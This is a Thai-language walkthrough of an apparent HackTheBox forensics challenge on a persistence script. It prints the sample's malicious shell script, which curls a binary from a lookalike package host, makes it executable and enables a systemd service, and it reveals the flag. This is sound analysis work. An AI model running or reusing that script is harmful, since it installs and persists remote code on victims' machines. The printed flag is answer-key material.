Hi, Can you speak Thai ?

Yes, I can speak Thai.

มา วันนี้เราจะมาทำข้อ Fake News หมวด Forensics ระดับ Easy

Step 1 wget 

ใช้คำสั่ง mkdir ใช้สำหรับสร้างไดเรกทอรี (หรือโฟลเดอร์) ใหม่บนระบบไฟล์
```
mkdir <new directory>
```
ตามด้วย คำสั่ง cd ใช้สำหรับเปลี่ยนไดเรกทอรีหรือโฟลเดอร์ปัจจุบันในเทอร์มินัล
```
cd <new directory>
```
ตามด้วย คำสั่ง wget ใช้สำหรับดาวน์โหลดไฟล์จากอินเทอร์เน็ตโดยตรงผ่านบรรทัดคำสั่ง

ตามด้วยคำสัั่ง ls เพื่อตรวจสอบว่าการดาวน์โหลดไฟล์สำเร็จหรือไม่ ก็คือมีไฟล์เข้ามาหรือไม่นั่นแหละ

ตามด้วยคำสั่ง mv เราจะใช้คำสั่งนี้้สำหรับเปลี่ยนชื่อไฟล์

เอ้อ ก่อนจะใช้คำสั่ง mkdir ให้ cd Downloads ก่อนนะ เพราะเราจะดาวน์โหลดไฟล์โจทย์เข้ามาในโฟลเดอร์ Downloads ฉัน cd Downloads ไว้อยู่แล้วในโจทย์ก่อนหน้านั้นที่ฉันทำ ทุกคนจึงไม่ได้เห็นขั้นตอนที่ฉันใช้คำสั่งนี้

```
┌──(kali㉿kali)-[~/Downloads]
└─$ mkdir Extraterrestrial_Persistence
                                                                                                               
┌──(kali㉿kali)-[~/Downloads]
└─$ cd Extraterrestrial_Persistence
                                                                                                               
┌──(kali㉿kali)-[~/Downloads/Extraterrestrial_Persistence]
└─$ wget "https://labs.hackthebox.com/api/v4/challenge/download/470?auth_user_id=2469954&expires=1766589064&signature=364f90e7491a30851f7b12e517cc6d30a7ff665ea0cc801f973849c6e14fc045"
--2025-12-24 09:11:06--  https://labs.hackthebox.com/api/v4/challenge/download/470?auth_user_id=2469954&expires=1766589064&signature=364f90e7491a30851f7b12e517cc6d30a7ff665ea0cc801f973849c6e14fc045
Resolving labs.hackthebox.com (labs.hackthebox.com)... 109.176.239.70, 109.176.239.69
Connecting to labs.hackthebox.com (labs.hackthebox.com)|109.176.239.70|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 687 [application/zip]
Saving to: ‘470?auth_user_id=2469954&expires=1766589064&signature=364f90e7491a30851f7b12e517cc6d30a7ff665ea0cc801f973849c6e14fc045’

470?auth_user_id=2469954&ex 100%[==========================================>]     687  --.-KB/s    in 0s      

2025-12-24 09:11:07 (2.18 MB/s) - ‘470?auth_user_id=2469954&expires=1766589064&signature=364f90e7491a30851f7b12e517cc6d30a7ff665ea0cc801f973849c6e14fc045’ saved [687/687]

                                                                                                               
┌──(kali㉿kali)-[~/Downloads/Extraterrestrial_Persistence]
└─$ ls
'470?auth_user_id=2469954&expires=1766589064&signature=364f90e7491a30851f7b12e517cc6d30a7ff665ea0cc801f973849c6e14fc045'
                                                                                                               
┌──(kali㉿kali)-[~/Downloads/Extraterrestrial_Persistence]
└─$ mv '470?auth_user_id=2469954&expires=1766589064&signature=364f90e7491a30851f7b12e517cc6d30a7ff665ea0cc801f973849c6e14fc045' Extraterrestrial_Persistence.zip
```

Step 2 unzip

ข้อนี้จะให้ไฟล์ .zip มาให้ ให้เราทำการแตกไฟล์ด้วยการใช้คำสั่ง unzip แล้วมันจะถาม password ในทุกโจทย์มี password สำหรับแตกไฟล์ไว้อยู่แล้ว ให้เราทำการคัดลอกแล้วเอามาใส่

```
┌──(kali㉿kali)-[~/Downloads/Extraterrestrial_Persistence]
└─$ unzip Extraterrestrial_Persistence.zip 
Archive:  Extraterrestrial_Persistence.zip
[Extraterrestrial_Persistence.zip] persistence.sh password: 
  inflating: persistence.sh          
                                                                                                               
┌──(kali㉿kali)-[~/Downloads/Extraterrestrial_Persistence]
└─$ ls
Extraterrestrial_Persistence.zip  persistence.sh
```

เมื่อทำการแตกไฟล์แล้ว เราจะได้ไฟล์มา 1 ไฟล์

Step 3 file

คำสั่ง file ใช้สำหรับระบุประเภทของไฟล์ ว่าเป็นไฟล์ประเภทไหน

```
┌──(kali㉿kali)-[~/Downloads/Extraterrestrial_Persistence]
└─$ file persistence.sh
persistence.sh: ASCII text, with very long lines (396), with CRLF line terminators
```

ในส่วนของข้อนี้ ไฟล์ที่ชื่อว่า "persistence.sh" มันบอกว่าเป็น ASCII text 

ASCII คือ รหัสมาตรฐานที่ใช้แปลงตัวอักษร ตัวเลข และสัญลักษณ์ต่างๆ ให้เป็นตัวเลขไบนารี เพื่อให้คอมพิวเตอร์เข้าใจและแลกเปลี่ยนข้อมูลกันได้ โดยใช้ 7 บิต (128 รหัส)

Step 4 strings

คำสั่ง strings ใช้สำหรับดึงเอาข้อความที่สามารถอ่านได้ออกมาจากไฟล์ไบนารี เช่น ไฟล์โปรแกรม, ไฟล์ออบเจ็กต์ หรือไฟล์อื่นๆ ที่ไม่ใช่ไฟล์ข้อความธรรมดา โดยจะค้นหาลำดับของอักขระที่พิมพ์ได้ (4 ตัวขึ้นไป) เพื่อให้ผู้ใช้สามารถดูข้อมูลสำคัญ, ข้อความผิดพลาด, หรือข้อมูลอื่น ๆ ที่ฝังอยู่ในไฟล์นั้นได้ง่ายขึ้น

```
┌──(kali㉿kali)-[~/Downloads/Extraterrestrial_Persistence]
└─$ strings persistence.sh                    
n=`whoami`
h=`hostname`
path='/usr/local/bin/service'
if [[ "$n" != "pandora" && "$h" != "linux_HQ" ]]; then exit; fi
curl https://files.pypi-install.com/packeges/service -o $path
chmod +x $path
echo -e "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA=="|base64 --decode > /usr/lib/systemd/system/service.service
systemctl enable service.service
```

Step 5 Base64

จาก Step 4 เราจะเห็นข้อความที่ถูกเข้ารหัสด้วย Base64 อยู่ ถ้าเราไม่มั่นใจว่ามันถูกเข้ารหัสด้วย Base64 ให้สังเกตหลังเครื่องหมายไพป์ (|) มันช่วยยืนยันว่านั่นคือ Base64 

```
"W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA=="
```

เราสามารถทำการถอดรหัสได้ โดยใช้ CyberChef หรือคำสั่งบน Kali Linux

```
┌──(kali㉿kali)-[~/Downloads/Extraterrestrial_Persistence]
└─$ echo "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA==" | base64 -d
[Unit]
Description=HTB{th3s3_4l13nS_4r3_s00000_b4s1c}
After=network.target network-online.target

[Service]
Type=oneshot
RemainAfterExit=yes

ExecStart=/usr/local/bin/service
ExecStop=/usr/local/bin/service

[Install]
WantedBy=multi-user.target                                                                                                               
```

เพิ่มเติม

- ASCII มีข้อจำกัดหลัก คือรองรับเฉพาะภาษาอังกฤษเท่านั้น ไม่สามารถแสดงผลภาษาไทย จีน หรือญี่ปุ่นได้ ด้วยเหตุนี้ ทำให้ในปัจจุบันเราจึงนิยมใช้ Unicode ซึ่งพัฒนาต่อยอดมาจาก ASCII แต่มีขนาดใหญ่กว่ามาก ทำให้สามารถบรรจุตัวอักษรได้ทุกภาษาทั่วโลกรวมถึง Emoji ด้วย

- ถ้าไม่มั่นใจว่ามันคือ Base64 หรือเปล่า และไม่มีข้อมูลอะไรที่ชี้ชัด ให้เราเข้า Cipher Identifier
